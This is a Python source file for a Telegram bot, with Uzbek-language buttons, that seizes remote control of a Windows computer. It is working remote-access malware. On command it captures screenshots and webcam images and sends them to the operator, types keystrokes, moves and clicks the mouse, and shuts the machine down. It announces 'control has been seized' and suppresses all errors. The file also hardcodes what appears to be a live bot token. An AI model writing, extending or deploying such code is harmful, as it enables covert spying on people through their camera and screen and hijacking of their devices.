import os
import pyautogui
import telegram
import telegram.ext
from webbrowser import open_new_tab
import cv2

# bot_token = open("token.txt", "r").read()
# if bot_token == "":
#     bot_token = input("Token: ")
#     open("token.txt", "w+").write(bot_token)

bot_token = "5781049047:AAHpvXE5FB37rUWANN2-oxmAFGSvPQwdeKc"

mode = ""


def main_buttons() -> telegram.ReplyKeyboardMarkup:
    sc = telegram.KeyboardButton("Oynani suartga olish 📷")
    cm = telegram.KeyboardButton("Web cameradan surat olish")
    wt = telegram.KeyboardButton("Klaviyaturani qo'lga olish ⌨️")
    sht = telegram.KeyboardButton("Qurulmani o'chirish 💤")
    hb = telegram.KeyboardButton("Habar yozish")
    ms = telegram.KeyboardButton("Sichqonchani boshqarish")

    rm = telegram.ReplyKeyboardMarkup([[sc], [ms], [cm], [wt], [sht], [hb]], resize_keyboard=True)

    return rm


async def hello(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f'<b>Yaxsih nazorat qo\'lga olindi</b>', reply_markup=main_buttons(),
                                    parse_mode="html")


async def text(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE) -> None:
    try:
        global mode
        text = update.message.text

        if text == "Oynani suartga olish 📷":
            screenshot = pyautogui.screenshot()
            screenshot.save("picture.png")

            await update.message.reply_document(open("picture.png", "rb"))

        elif text == "Klaviyaturani qo'lga olish ⌨️":
            await update.message.reply_text("<b>Marhamat nima yozilishi kerakligini yozing.</b>",
                                            parse_mode="html")

            mode = "text"
        elif mode == "text":
            pyautogui.typewrite(text)
            mode = ""
            await update.message.reply_text("Bajarildi 😁")

        elif text == "Qurulmani o'chirish 💤":
            os.system("shutdown /s /t 5")
            await update.message.reply_text("5 sekundda ochadi 😁")
            await update.message.reply_text("Bot ham o'chadia")

        elif text == "Habar yozish":
            open_new_tab("https://1kb.uz/")
            await update.message.reply_text("Unga Ogohlantirish habari berildi")

        elif text == "Web cameradan surat olish":

            # pyautogui.press("win")
            # pyautogui.sleep(2)
            # pyautogui.write("camera")
            # pyautogui.sleep(2)
            # pyautogui.press("enter")
            #
            # pyautogui.sleep(5)
            #
            # screenshot = pyautogui.screenshot()
            # screenshot.save("1232.png")
            #
            # await update.message.reply_photo(open("1232.png", "rb"))

            # Web kamerani ochamiz
            cap = cv2.VideoCapture(0)  # 0 standart kamera uchun, agar ko'rsatgan raqamni o'zgartiring

            # Rasm saqlash uchun fayl nomi va rasm san'ati
            file_name = "picture.jpg"
            image_quality = 95  # Rasm sifati (0 - 100 oralig'ida)

            # Web kameradan rasm olish va saqlash
            ret, frame = cap.read()  # Web kameradan rasm olish

            if ret:
                cv2.imwrite(file_name, frame, [int(cv2.IMWRITE_JPEG_QUALITY), image_quality])  # Rasmni saqlash
            else:

                await update.message.reply_text("Xatolik yuz berdi")

            # Kamerani qisqartiramiz va to'xtatamiz
            cap.release()
            cv2.destroyAllWindows()

            await update.message.reply_document(open("picture.jpg", "rb"))


        elif text == "Sichqonchani boshqarish":
            tep = telegram.KeyboardButton(text="/\ ")
            pas = telegram.KeyboardButton(text="\/")
            ong = telegram.KeyboardButton(text=">")
            chap = telegram.KeyboardButton(text="<")
            r = telegram.KeyboardButton(text="O'ng tugmani bosish")
            l = telegram.KeyboardButton(text="Chap tugmani bosish")
            rm = telegram.ReplyKeyboardMarkup([[tep], [chap, ong], [pas], [l, r]])
            await update.message.reply_text("Marhamat", reply_markup=rm)

        elif text == "/\ "[:-1]:
            await update.message.delete()
            y = pyautogui.position().y
            x = pyautogui.position().x
            pyautogui.moveTo(x, y - 10)

        elif text == "\/":
            await update.message.delete()
            y = pyautogui.position().y

            x = pyautogui.position().x

            pyautogui.moveTo(x, y + 10)

        elif text == "<":
            await update.message.delete()
            y = pyautogui.position().y
            x = pyautogui.position().x
            pyautogui.moveTo(x - 10, y)

        elif text == ">":
            await update.message.delete()
            y = pyautogui.position().y
            x = pyautogui.position().x
            pyautogui.moveTo(x + 10, y)

        elif text == "Chap tugmani bosish":
            pyautogui.leftClick()
            await update.message.delete()

        elif text == "O'ng tugmani bosish":
            pyautogui.rightClick()
            await update.message.delete()
    except Exception:
        pass


app = telegram.ext.ApplicationBuilder().token(bot_token).build()

app.add_handler(telegram.ext.CommandHandler("take_control", hello))
app.add_handler(telegram.ext.MessageHandler(telegram.ext.filters.TEXT, text))

app.run_polling()
